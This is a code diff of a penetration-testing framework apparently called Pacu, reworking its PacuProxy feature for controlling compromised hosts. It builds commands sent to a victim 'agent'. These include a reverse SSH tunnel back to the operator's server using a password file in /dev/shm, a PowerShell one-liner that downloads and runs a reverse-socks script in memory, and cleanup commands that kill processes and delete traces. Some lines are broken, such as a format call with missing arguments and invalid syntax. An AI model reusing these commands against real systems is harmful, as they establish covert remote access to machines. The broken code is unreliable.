@@ -7,12 +7,14 @@ import platform
 from queue import Queue
 import random
 import re
+import shlex
 import string
 import subprocess
 import sys
 import threading
 import time
 import traceback
+from http.server import BaseHTTPRequestHandler, HTTPServer
 
 try:
     import requests
@@ -399,10 +401,10 @@ class Main:
         else:
             return 'Incorrect input, expected target operating system ("sh" or "ps"), received: {}'.format(os)
 
-    def get_ssh_user(self, ssh_username):
+    def get_ssh_user(self, ssh_username, ssh_password=None):
         user_id = ''
         if ssh_username is None or ssh_username == '':
-            new_user = self.input('No SSH user found to create the reverse connection back from the target agent. An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with password login disabled and a /bin/false shell. Do you want to generate that user now? (y/n) ')
+            new_user = self.input('No SSH user found to create the reverse connection back from the target agent. An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with a random 25 character password and a /bin/false shell. Do you want to generate that user now? (y/n) ')
 
             if new_user == 'y':
                 # Create a random username that is randomly 3-9 characters
@@ -416,103 +418,82 @@ class Main:
                         user_id = subprocess.check_output('id -u {}'.format(username), shell=True).decode('utf-8')
                         if 'no such user' in user_id:
                             self.print('[0] Failed to find user after creation. Here is the output from the command "id -u {}": {}\n'.format(username, user_id))
-                            return None
-                        self.print('User {} created successfully!\n'.format(username))
-                        return username
+                            return None, None, False
+                        self.print('User {} created! Adding a password...\n'.format(username))
+                        password = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=25))
+                        command = 'echo "{}:{}" | chpasswd'.format(username, password)
+                        try:
+                            subprocess.run(command.split(' '), shell=True)
+                        except Exception as error:
+                            self.print('Failed to add a password...\n')
+                            return username, None, True
+                        return username, password, self.update_sshd_config()
                     except Exception as error:
-                        self.print('[1] Failed to find user after creation. Here is the output from the command "id -u {}": {}\n'.format(username, user_id))
-                        return None
+                        self.print('Failed to find user after creation. Here is the output from the command "id -u {}": {}\n'.format(username, user_id))
+                        return None, None, False
 
                 except Exception as error:
-                    self.print('[2] Failed to create user...')
-                    return None
+                    self.print('Failed to create user...')
+                    return None, None, False
 
             else:
-                return None
+                return None, None, False
 
         else:
             try:
                 user_id = subprocess.check_output('id -u {}'.format(ssh_username), shell=True).decode('utf-8')
                 if 'no such user' in user_id:
-                    self.print('[3] Failed to find a valid SSH user. Here is the output from the command "id -u {}": {}\n'.format(ssh_username, user_id))
-                    new_user = self.input('An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with password login disabled and a /bin/false shell. Do you want to generate that user now? (y/n) ')
+                    self.print('Failed to find a valid SSH user. Here is the output from the command "id -u {}": {}\n'.format(ssh_username, user_id))
+                    new_user = self.input('An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with a random 25 character password and a /bin/false shell. Do you want to generate that user now? (y/n) ')
                     if new_user == 'y':
-                        return self.get_ssh_user(None)
+                        return self.get_ssh_user(None, None)
                     else:
-                        return None
+                        return None, None, False
                 else:
-                    return ssh_username
+                    return ssh_username, ssh_password, False
             except Exception as error:
-                self.print('[4] Failed to find a valid SSH user. Here is the output from the command "id -u {}": {}\n'.format(ssh_username, user_id))
-                new_user = self.input('An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with password login disabled and a /bin/false shell. Do you want to generate that user now? (y/n) ')
+                self.print('Failed to find a valid SSH user. Here is the output from the command "id -u {}": {}\n'.format(ssh_username, user_id))
+                new_user = self.input('An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with a random 25 character password and a /bin/false shell. Do you want to generate that user now? (y/n) ')
                 if new_user == 'y':
-                    return self.get_ssh_user(None)
+                    return self.get_ssh_user(None, None)
                 else:
-                    return None
+                    return None, None, False
 
-    def get_ssh_key(self, ssh_username, ssh_priv_key):
-        if ssh_priv_key is None or ssh_priv_key == '':
-            new_key = self.input('No SSH key found for user {}. Do you want to generate one? (y/n) '.format(ssh_username))
-
-            if new_key == 'y':
-                self.print('Setting up SSH access for user {}...\n'.format(ssh_username))
-                ssh_dir = '/home/{}/.ssh'.format(ssh_username)
-                command = 'ssh-keygen -t rsa -f {}/id_rsa'.format(ssh_dir)
-
-                try:
-                    self.print('Creating .ssh dir for user {ssh_username} and passing ownership...')
-                    if not os.path.isdir(ssh_dir):
-                        os.makedirs(ssh_dir)
-                    subprocess.run('chown -R {}:{} {}'.format(ssh_username, ssh_username, ssh_dir).split(' '))
-                    subprocess.run('chmod 700 {}'.format(ssh_dir).split(' '))
-                    self.print('Generating public and private SSH key...')
-                    subprocess.run(command.split(' '))
-                    self.print('Creating authorized_keys file...')
-                    subprocess.run('cp {}/id_rsa.pub {}/authorized_keys'.format(ssh_dir, ssh_dir).split(' '))
-
-                    self.print('Ensuring that local port forwarding is disabled (to prevent a "hack back" scenario)...')
-                    action = ''
-                    with open('/etc/ssh/sshd_config', 'r') as config_file:
-                        contents = config_file.read()
-                        if 'AllowTcpForwarding' in contents:
-                            if 'AllowTcpForwarding remote' in contents:
-                                self.print('Already disabled.')
-                            else:
-                                action = 'replace'
-                        else:
-                            action = 'add'
-
-                    with open('/etc/ssh/sshd_config', 'w') as config_file:
-                        if action == 'replace':
-                            contents = re.sub(r'.*AllowTcpForwarding.*', 'AllowTcpForwarding remote', contents)
-                            config_file.write(contents)
-                        elif action == 'add':
-                            contents += '\nAllowTcpForwarding remote'
-                            config_file.write(contents)
-                        else:
-                            config_file.write(contents)
-                    with open('{}/id_rsa'.format(ssh_dir), 'r') as config_file:
-                        ssh_priv_key = config_file.read()
-
-                    return ssh_priv_key
-
-                except Exception as error:
-                    self.print('[5] Could not setup SSH access for user {}...'.format(ssh_priv_key))
-                    return None
-
+    def update_sshd_config(self):
+        self.print('Ensuring that local port forwarding is disabled (to prevent a "hack back" scenario). This is done by editing /etc/ssh/sshd_config to either add the line or modify the value if the setting already exists: "AllowTcpForwarding remote". This prevents the target server from forwarding our local ports back to them.')
+        action = ''
+        with open('/etc/ssh/sshd_config', 'r') as config_file:
+            contents = config_file.read()
+            if 'AllowTcpForwarding' in contents:
+                if 'AllowTcpForwarding remote' in contents:
+                    self.print('Already disabled.')
+                else:
+                    action = 'replace'
             else:
-                return None
+                action = 'add'
 
-        else:
-            return ssh_priv_key
+        with open('/etc/ssh/sshd_config', 'w') as config_file:
+            if action == 'replace':
+                contents = re.sub(r'.*AllowTcpForwarding.*', 'AllowTcpForwarding remote', contents)
+                config_file.write(contents)
+                return True
+            elif action == 'add':
+                contents += '\nAllowTcpForwarding remote'
+                config_file.write(contents)
+                return True
+        return False
 
     # Pacu commands and execution
 
     def parse_command(self, command):
         command = command.strip()
-        command = command.split(' ')
+        try:
+            command = shlex.split(command)
+        except ValueError:
+            self.print('  Error: Unbalanced quotes in command')
+            return
 
-        if command[0] == '':
+        if not command or command[0] == '':
             return
         elif command[0] == 'data':
             self.parse_data_command(command)
@@ -559,7 +540,7 @@ class Main:
                 'Port': proxy_settings.port,
                 'Listening': proxy_settings.listening,
                 'SSHUsername': proxy_settings.ssh_username,
-                'SSHPrivateKey': proxy_settings.ssh_priv_key,
+                'SSHPassword': proxy_settings.ssh_password,
                 'TargetAgent': copy.deepcopy(proxy_settings.target_agent)
             }
             self.print(proxy)
@@ -571,7 +552,7 @@ class Main:
                     'Port': proxy_settings.port,
                     'Listening': proxy_settings.listening,
                     'SSHUsername': proxy_settings.ssh_username,
-                    'SSHPrivateKey': proxy_settings.ssh_priv_key,
+                    'SSHPassword': proxy_settings.ssh_password,
                     'TargetAgent': copy.deepcopy(proxy_settings.target_agent)
                 }
                 self.print(proxy)
@@ -617,12 +598,14 @@ class Main:
     def parse_proxy_command(self, command):
         proxy_settings = self.get_proxy_settings()
 
+        shm_name = proxy_settings.ssh_shm_name
         proxy_ip = proxy_settings.ip
         proxy_port = proxy_settings.port
         proxy_listening = proxy_settings.listening
         proxy_ssh_username = proxy_settings.ssh_username
-        proxy_ssh_priv_key = proxy_settings.ssh_priv_key
+        proxy_ssh_password = proxy_settings.ssh_password
         proxy_target_agent = copy.deepcopy(proxy_settings.target_agent)
+        
 
         if len(command) == 1 or (len(command) == 2 and command[1] == 'help'):  # Display proxy help
             self.display_proxy_help()
@@ -663,6 +646,15 @@ class Main:
             if proxy_listening is False:
                 print('There does not seem to be a listener running currently.')
             else:
+                if not proxy_target_agent == []:
+                    if proxy_target_agent[-1].startswith('Windows'):
+                        pass
+                    #    for i, conn in enumerate(self.server.all_connections):
+                    #        if self.server.all_addresses[i][0] == proxy_target_agent[0]:
+                    #            self.server.run_cmd(proxy_target_agent[0], self.server.all_connections[i], 'Stop-PortForwardJobs')
+                    #            break
+                    else:
+                        self.server.run_cmd(proxy_target_agent[0], self.server.all_connections[i], 'kill -9 $! && rm /dev/shm/{}'.format(shm_name))
                 self.server.quit_gracefully()
                 self.queue.put(5)
                 self.server = None
@@ -687,52 +679,42 @@ class Main:
                 try:
                     if command[2] == 'none':
                         self.print('** No longer using a remote PacuProxy agent to route commands. **')
+                        if proxy_target_agent[-1].startswith('Windows'):
+                            pass
+                        #    for i, conn in enumerate(self.server.all_connections):
+                        #        if self.server.all_addresses[i][0] == proxy_target_agent[0]:
+                        #            self.server.run_cmd(proxy_target_agent[0], self.server.all_connections[i], 'powershell Stop-PortForwardJobs')
+                        #            break
+                        else:
+                            self.server.run_cmd(proxy_target_agent[0], self.server.all_connections[i], 'kill -9 $! && rm /dev/shm/{}'.format(shm_name))
                         proxy_target_agent = []
                     else:
+                        proxy_target_agent = self.server.all_addresses[int(command[2])]
                         if platform.system() == 'Windows':
                             self.print('** Windows hosts do not currently support module proxying. Run the PacuProxy server on a Linux host for full module proxying capability. **')
                             return
+
                         try:
                             test = int(command[2])
                         except:
                             self.print('** Invalid agent ID, expected an integer or "none", received: {} **'.format(command[2]))
                             return
-                        proxy_target_agent = self.server.all_addresses[int(command[2])]
-
-                        if proxy_target_agent[-1].startswith('Windows'):
-                            self.print('** Invalid agent target. Windows hosts are not supported as a proxy agent (coming soon), but they can still be staged and you can still run shell commands on them. **')
-                            return
 
                         print('Setting proxy target to agent {}...'.format(command[2]))
 
-                        old_username = proxy_ssh_username
-
                         # Find or create an SSH user
-                        proxy_ssh_username = self.get_ssh_user(proxy_ssh_username)
+                        proxy_ssh_username, proxy_ssh_password, restart_sshd = self.get_ssh_user(proxy_ssh_username, proxy_ssh_password)
                         if proxy_ssh_username is None:
                             self.print('No SSH user on the local PacuProxy server, not routing traffic through the target agent.')
                             return
-
-                        # In case there previously was a user and for some reason a new one needed to be created,
-                        # ensure that a new key gets created for them
-                        if not old_username == proxy_ssh_username:
-                            proxy_ssh_priv_key = None
-
-                        restart = False
-                        if proxy_ssh_priv_key is None or proxy_ssh_priv_key == '':
-                            restart = True
-
-                        # Find or generate an SSH key for that user
-                        proxy_ssh_priv_key = self.get_ssh_key(proxy_ssh_username, proxy_ssh_priv_key)
-                        if proxy_ssh_priv_key is None:
-                            self.print('No SSH key for user {}, not routing traffic through the target agent.'.format(proxy_ssh_username))
-                            proxy_settings.update(self.database, ssh_username=proxy_ssh_username)
+                        if proxy_ssh_password is None:
+                            self.print('Failed to set a password for user {}, not routing traffic through the target agent.'.format(proxy_ssh_username))
                             return
 
-                        # If an SSH key was just generated, make sure local port forwarding is disabled
-                        if restart is True:
-                            self.print('SSH user setup successfully. It is highly recommended to restart your sshd service before continuing. Part of the SSH user creation process was to restrict access to local port forwarding, but this change requires an sshd restart. If local port forwarding is not disabled, your target machine can "hack back" by forwarding your local ports to their machine and accessing the services hosted on them. This can be done by running "service sshd restart".\n')
-                            proxy_settings.update(self.database, ssh_username=proxy_ssh_username, ssh_priv_key=proxy_ssh_priv_key)
+                        # If an SSH user was just generated, make sure local port forwarding is disabled
+                        if restart_sshd is True:
+                            self.print('SSH user setup successfully. It is highly recommended to restart your sshd service before continuing. Part of the SSH user creation process was to restrict access to local port forwarding, but this change requires an sshd restart. If local port forwarding is not disabled, your target machine can "hack back" by forwarding your local ports to their machine and accessing the services hosted on them. This can be done on most systems by running "service sshd restart".\n')
+                            proxy_settings.update(self.database, ssh_username=proxy_ssh_username, ssh_password=proxy_ssh_password)
                             restart_sshd = self.input('  Do you want Pacu to restart sshd (Warning: If you are currently connected to your server over SSH, you may lose your connection)? Press enter if so, enter "ignore" to ignore this warning, or press Ctrl+C to exit and restart it yourself (Enter/ignore/Ctrl+C): ')
 
                             if restart_sshd == 'ignore':
@@ -740,19 +722,93 @@ class Main:
                             elif restart_sshd == '':
                                 self.print('Restarting sshd...')
                                 subprocess.run('service sshd restart', shell=True)
+                                time.sleep(5)
 
                         self.print('Telling remote agent to connect back...')
-                        shm_name = ''.join(random.choices(string.ascii_lowercase, k=int(''.join(random.choices('3456789', k=1)))))
-                        connect_back_cmd = 'echo "{}" > /dev/shm/{} && chmod 600 /dev/shm/{} && ssh -i /dev/shm/{} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 8001 {}@{} >/dev/null 2>&1 &'.format(proxy_ssh_priv_key, shm_name, shm_name, shm_name, proxy_ssh_username, proxy_ip)
+
+                        if proxy_target_agent[-1].startswith('Windows'):
+                            self.print('Windows hosts not supported yet (coming soon!)')
+                            return
+                            secret_string = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=25))
+
+                            class S(BaseHTTPRequestHandler):
+                                def _set_headers(self):
+                                    self.send_response(200)
+                                    self.send_header('Content-Type', 'text/plain')
+                                    self.send_header('Server', random.choice(['Apache', 'nginx']))  # Maybe make this perm per session or remove altogether
+                                    self.end_headers()
+
+                                def do_GET(self):
+                                    self._set_headers()
+                                    if self.path == '/{}'.format(secret_string):
+                                        with open('pp_modules/powershell/reverse-socks.ps1', 'r') as f:
+                                            script = f.read().encode()
+                                    else:
+                                        script = b''
+                                    self.wfile.write(script)
+                                    return
+
+                            def run(server_class=HTTPServer, handler_class=S, port=80):
+                                server_address = (proxy_ip, port)
+                                try:
+                                    httpd = server_class(server_address, handler_class)
+                                except OSError as error:
+                                    if 'Cannot assign requested address' in str(error):
+                                        print('Failed to listen on http://{}:{}. This is a known error.'.format(proxy_ip, port))
+                                        print('Listening on http://0.0.0.0:{} instead...'.format(port))
+                                        server_address = ('0.0.0.0', port)
+                                        httpd = server_class(server_address, handler_class)
+                                httpd.serve_forever()
+
+                            t = threading.Thread(target=run, daemon=True)
+                            t.start()
+                            time.sleep(2)
+
+                            # 1. Start a new thread
+                            # 2. Start an HTTP server on it with the .ps1 file
+                            # 3. Continue to send the connect_back_cmd
+                            # 4. Kill HTTP server
+
+                            # Download the script from the PacuProxy server
+                            downloaded_string = "(New-Object System.Net.WebClient).DownloadString('http://{}:5051/{}')".format(proxy_ip, secret_string)
+                            
+                            # Run Invoke-Expression on the downloaded script to import it to memory
+                            invoke_expression = 'powershell iex({})'.format(downloaded_string)
+                            
+                            # Execute the newly imported script to start the reverse proxy
+                            start_proxy_cmd = 'Start-SocksProxy -sshhost {} -username {} -password {} -RemotePort 8001 -LocalPort 5050'.format(proxy_ip, proxy_ssh_username, proxy_ssh_password)
+
+                            # Combine the commands into a one-liner
+                            connect_back_cmd = '{}; {}'.format(invoke_expression, start_proxy_cmd)
+                        else:
+                            if shm_name == '':
+                                shm_name = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=5))
+                            
+                            # Create an in-memory file in /dev/shm that contains the password
+                            create_shm = 'echo "echo {}" > /dev/shm/{}'.format(shm_name)
+                            
+                            # Give the file 777 permissions
+                            add_permissions = 'chmod 777 /dev/shm/{}'.format(shm_name)
+                            
+                            # DISPLAY=dummy to emulate a display
+                            # SSH_ASKPASS=/dev/shm/{} to tell SSH that the file will echo it a password
+                            # setsid to avoid any prompts
+                            # Runs ssh to connect to the PacuProxy server over SSH while forwarding a port,
+                            # without trying to open a shell, but keeping a persistent connection, and
+                            # redirecting stderr to stdout (which then comes back to PacuProxy)
+                            connect = 'DISPLAY=dummy SSH_ASKPASS=/dev/shm/{} setsid ssh -o UserKnownHostsFile=/dev/null -f -N -R 8001 -o StrictHostKeyChecking=no {}@{} >/dev/null 2>&1 &'.format(shm_name, proxy_ssh_username@proxy_ip)
+
+                            # Combine the commands into a one-liner
+                            connect_back_cmd = '{} && {} && {}'.format(create_shm, add_permissions, connect)
                         self.server.run_cmd(proxy_target_agent[0], self.server.all_connections[int(command[2])], connect_back_cmd)
-                        self.print('Remote agent connected!')
+                        self.print('Remote agent instructed to connect!')
                 except Exception as error:
                     self.print('** Invalid agent ID, expected an integer or "none": {} **'.format(error))
             else:
                 self.print('** Incorrect input, excepted an agent ID, received: {}'.format(command[2:]))
         else:
             self.print('** Unrecognized proxy command: {} **'.format(command[1]))
-        proxy_settings.update(self.database, ssh_username=proxy_ssh_username, ssh_priv_key=proxy_ssh_priv_key, listening=proxy_listening, target_agent=proxy_target_agent)
+        proxy_settings.update(self.database, ssh_username=proxy_ssh_username, ssh_password=proxy_ssh_password, ssh_shm_name=shm_name, listening=proxy_listening, target_agent=proxy_target_agent)
         return
 
     def parse_exec_module_command(self, command):
@@ -913,6 +969,17 @@ class Main:
             return module
         return None
 
+    def all_region_prompt(self):
+        print('Automatically targeting region(s):')
+        for region in self.get_regions('all'):
+            print('  {}'.format(region))
+        response = input('Do you wish to continue? (y/n)')
+        if response.lower() == 'y':
+            return True
+        else:
+            return False
+
+
     ###### Some module notes
     # For any argument that needs a value and a region for that value, use the form
     # value@region
@@ -946,16 +1013,29 @@ class Main:
             else:
                 self.print('  Running module {} on agent at {}...'.format(module_name, proxy_settings.target_agent[0]))
 
-            self.running_module_names.append(module.module_info['name'])
+            try:
+                args = module.parser.parse_args(command[2:])
+                if 'regions' in args and args.regions is None:
+                    session = self.get_active_session()
+                    if session.session_regions == ['all']:
+                        if not self.all_region_prompt():
+                            return
+            except SystemExit:
+                print('  Error: Invalid Arguments')
+                return
 
+            self.running_module_names.append(module.module_info['name'])
             try:
                 summary_data = module.main(command[2:], self)
-
+                # If the module's return value is None, it exited early.
+                if summary_data is not None:
+                    summary = module.summary(summary_data, self)
+                    if len(summary) > 1000:
+                        raise ValueError('The {} module\'s summary is too long ({} characters). Reduce it to 1000 characters or fewer.'.format(module.module_info['name'], len(summary)))
+                    if not isinstance(summary, str):
+                        raise TypeError(' The {} module\'s summary is {}-type instead of str. Make summary return a string.'.format(module.module_info['name'], type(summary)))
+                    self.print('MODULE SUMMARY:\n\n{}\n'.format(summary.strip('\n')))
             except SystemExit as error:
-                try:
-                    self.running_module_names.pop()
-                except IndexError:
-                    pass
                 exception_type, exception_value, tb = sys.exc_info()
                 if 'SIGINT called' in exception_value.args:
                     self.print('^C\nExiting the currently running module.')
@@ -964,41 +1044,17 @@ class Main:
                     session, global_data, local_data = self.get_data_from_traceback(tb)
                     self.log_error(
                         traceback_text,
-                        exception_info='{}: {}\n\nPacu caught a SystemExit error. This may be due to incorrect module arguments received by argparse in the module itself. Check to see if any required arguments are not being received by the module when it executes.'.format(exception_type, exception_value),
+                        exception_info='{}: {}\n\nPacu caught a SystemExit error. '.format(exception_type, exception_value),
                         session=session,
                         local_data=local_data,
                         global_data=global_data
                     )
-                return
-
-            except Exception as error:
-                try:
-                    self.running_module_names.pop()
-                except IndexError:
-                    pass
-                raise
-
-            # If the module's return value is None, it exited early.
-            if summary_data is not None:
-                summary = module.summary(summary_data, self)
-                if len(summary) > 1000:
-                    raise ValueError('The {} module\'s summary is too long ({} characters). Reduce it to 1000 characters or fewer.'.format(module.module_info['name'], len(summary)))
-                if not isinstance(summary, str):
-                    raise TypeError(' The {} module\'s summary is {}-type instead of str. Make summary return a string.'.format(module.module_info['name'], type(summary)))
-                self.print('MODULE SUMMARY:\n\n{}\n'.format(summary.strip('\n')))
-
-            try:
+            finally:
                 self.running_module_names.pop()
-            except IndexError:
-                pass
-            return
-
         elif module_name in self.COMMANDS:
             print('Error: "{}" is the name of a Pacu command, not a module. Try using it without "run" or "exec" in front.'.format(module_name))
-
         else:
             print('Module not found. Is it spelled correctly? Try using the module search function.')
-            return
 
     def display_command_help(self, command_name):
         if command_name == 'proxy':
@@ -1449,8 +1505,8 @@ class Main:
                             results = [c + ' ' for c in MODULES if c.startswith(cmd)] + [None]
 
                     elif len(line) == 3 and line[0] == 'search' and line[1] in ('cat', 'category'):
-                            cmd = line[2].strip()
-                            results = [c + ' ' for c in CATEGORIES if c.startswith(cmd)] + [None]
+                        cmd = line[2].strip()
+                        results = [c + ' ' for c in CATEGORIES if c.startswith(cmd)] + [None]
 
                     elif len(line) >= 3:
                         if line[0].strip() == 'run' or line[0].strip() == 'exec':
@@ -1495,59 +1551,30 @@ class Main:
             try:
                 if not idle_ready:
                     print("""
-                                                                .,*(###((,.
-                                                           ,#&&&&&&&&&&&&&&&&&%*
-                                                         /&&&&&&&&&&&&&&&&&&&&&&&&.
-                                                      *&&&&&&&/.       .*(&&&&&&&&(
-                                                     %&&&&&&%,                (&&&&&&&/
-                                                   .%&&&&                     *&&&&&&*
-                                                  ,#(/**/*                        (&&&&&(
-                                                                                   /&&&&&%#%&&&&&&%#*
-                                                   ..,**//**,..                     /&&&&&&&&&&&&&&&&&&(
-                    .,*/##%%&&&&&&&&&%%#(*,*#%&&&&&&&&&&&&&&&&&&&&&%(*.             .%&&&&&&&&&&&&&&&&&&&/
-                                  .,/#%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&,         ,&&&&/        .#&&&&&&
-                             ........    ,%&&&&&&&&&&&&&&&&&&&. .*#%&&&&&&&&&%,                      .&&&&&/
-                   .*/////((##%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.      .*#&&&&&&&.                    (&&&&%
-                                  .#&&&&&&&&&&&&&&&&&&&&&&&&&&&.     .*#&&&&&&&&&&&*                  .&&&&&*
-                      .*#%%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&*                ,&&&&&&%(
-                             *&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&/,.                         *&&&&&&&&&&&/
-                     .*#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%/.   .,/#%&&&&&&.                  .(%%&&&&&&&&&*
-                          (&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&*   ./#&&&&&&%%&&&&(                         ,#&&&&&&%.
-                        /&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&(.  ./%&&&&&%&&&&  (&/                             *&&&&&&/
-                       ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&,  .(&&&&&&&&%. %&&&,   .                                (&&&&&*
-                      *&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&/   .%&&&&&//&&&&%    *.                                      /&&&&&
-                     .%&&&&&&&&&&&&&&&&&&&&&&&&&&&&(   *&&&&&&&&(   #&/                                             &&&&&.
-          *(#%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&*   *&&&&.*%&&&/                                                   &&&&&,
-    *%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&/    (&&&&&.    *                                                    &&&&&,
- ,%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&         ./%                                                           .&&&&&.
-       ,#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&                                                                       %&&&&%
-          .(&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%.                                                                     .%&&&&&,
-              *&&&&&&&&&&&&&&&&&&&&&&&&&&%.                                                                    *&&&&&&%.
-             .(&&&&&&&&&&&&&&&&&&&&&&&&&&&                                  .                            .*#&&&&&&&/
-            (&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.                 (&/    (&.    &&,     %&&&&&&&&&&&&&&&&&&&&&&&&&&&&%
-          .&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&,           .&&&&% /&&&&/  #&&&/    %&&&&&&&&&&&&&&&&&&&&&&&&,
-          #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%#/,,,,*&&&&&&&&&&%&&&&&    %&&&&&&&&&&&&&&&&&&&%#(*.
-          &&&&&&&&&&/
-         .&&&&&&&%,   (%%%%%%%%%%%%%%##*          *##%%%%%%%%%%%##*         ,(#%%%%%%%%%%%##,      .#%%%%%%.      #%%%%%%,
-         .&&&&.       #&&&&&&&&&&&&&&&&&&&,     ,&&&&&&&&&&&&&&&&&&&*     *&&&&&&&&&&&&&&&&&&&(    .&&&&&&&,     .%&&&&&&*
-          &&&%.       #&&&&&&&&&&&&&&&&&&&&,   .&&&&&&&&&&&&&&&&&&&&&,   *&&&&&&&&&&&&&&&&&&&&&/   .&&&&&&&,     .%&&&&&&*
-          %&*         #&&&&&&&&&&&&&&&&&&&&&   .&&&&&&&&&&&&&&&&&&&&&,   *&&&&&&&&&&&&&&&&&&&&&(   .&&&&&&&,     .%&&&&&&*
-                      #&&&&&&(      #&&&&&&&   .&&&&&&&.     .&&&&&&&,   *&&&&&&&/     *&&&&&&&(   .&&&&&&&,     .%&&&&&&*
-                      #&&&&&&(      #&&&&&&&   .&&&&&&&.     .&&&&&&&,   *&&&&&&&/     *&&&&&&&(   .&&&&&&&,     .%&&&&&&*
-                      #&&&&&&(      #&&&&&&&   .&&&&&&&.     .&&&&&&&,   *&&&&&&&/     ,#######*   .&&&&&&&,     .%&&&&&&*
-                      #&&&&&&(      #&&&&&&&   .&&&&&&&.     .&&&&&&&,   *&&&&&&&/                 .&&&&&&&,     .%&&&&&&*
-                      #&&&&&&(      #&&&&&&&   .&&&&&&&.     .&&&&&&&,   *&&&&&&&/                 .&&&&&&&,     .%&&&&&&*
-                      #&&&&&&(      #&&&&&&&   .&&&&&&&.     .&&&&&&&,   *&&&&&&&/                 .&&&&&&&,     .%&&&&&&*
-                      #&&&&&&(      #&&&&&&&   .&&&&&&&.     .&&&&&&&,   *&&&&&&&/                 .&&&&&&&,     .%&&&&&&*
-                      #&&&&&&&&&&&&&&&&&&&&&   .&&&&&&&&&&&&&&&&&&&&&,   *&&&&&&&/                 .&&&&&&&,     .%&&&&&&*
-                      #&&&&&&&&&&&&&&&&&&&&%   .&&&&&&&&&&&&&&&&&&&&&,   *&&&&&&&/                 .&&&&&&&,     .%&&&&&&*
-                      #&&&&&&&&&&&&&&&&&&&%.   .&&&&&&&&&&&&&&&&&&&&&,   *&&&&&&&/                 .&&&&&&&,     .%&&&&&&*
-                      #&&&&&&&&&&&&&&&,        .&&&&&&&%%%%%%%&&&&&&&,   *&&&&&&&/     *&&&&&&&(   .&&&&&&&,     .%&&&&&&*
-                      #&&&&&&(                 .&&&&&&&.     .&&&&&&&,   *&&&&&&&/     *&&&&&&&(   .&&&&&&&,     .%&&&&&&*
-                      #&&&&&&(                 .&&&&&&&.     .&&&&&&&,   *&&&&&&&&&&&&&&&&&&&&&(   .&&&&&&&&&&&&&&&&&&&&&*
-                      #&&&&&&(                 .&&&&&&&.     .&&&&&&&,   *&&&&&&&&&&&&&&&&&&&&&(    %&&&&&&&&&&&&&&&&&&&&,
-                      #&&&&&&(                 .&&&&&&&.     .&&&&&&&,   .&&&&&&&&&&&&&&&&&&&&&*    ,&&&&&&&&&&&&&&&&&&&%
-                      #&&&&&&(                 .&&&&&&&.     .&&&&&&&,     *%&&&&&&&&&&&&&&&&/        /%&&&&&&&&&&&&&&(.
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡿⠛⠉⠁⠀⠀⠈⠙⠻⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣷⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⡿⣿⣿⣷⣦⠀⠀⠀⠀⠀⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣈⣉⣙⣛⣿⣿⣿⣿⣿⣿⣿⣿⡟⠛⠿⢿⣿⣷⣦⣄⠀⠀⠈⠛⠋⠀⠀⠀⠈⠻⣿⣷⠀⠀⠀⠀⠀⠀
+ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣈⣉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣀⣀⣀⣤⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣆⠀⠀⠀⠀⠀
